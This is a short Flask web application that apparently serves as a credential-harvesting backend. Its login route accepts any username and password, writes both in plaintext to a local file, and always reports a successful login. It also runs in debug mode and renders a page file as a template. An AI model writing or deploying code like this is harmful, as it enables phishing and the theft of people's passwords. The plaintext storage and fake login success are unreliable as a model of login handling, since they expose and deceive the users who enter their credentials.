from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# Ensure log file exists
log_file = "logins.txt"
if not os.path.exists(log_file):
    open(log_file, 'w').close()

@app.route("/")
def home():
    return render_template_string(open("index.html").read())

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # Log the credentials
    with open(log_file, "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")
    
    return "Logged in successfully!"

if __name__ == "__main__":
    app.run(debug=True)
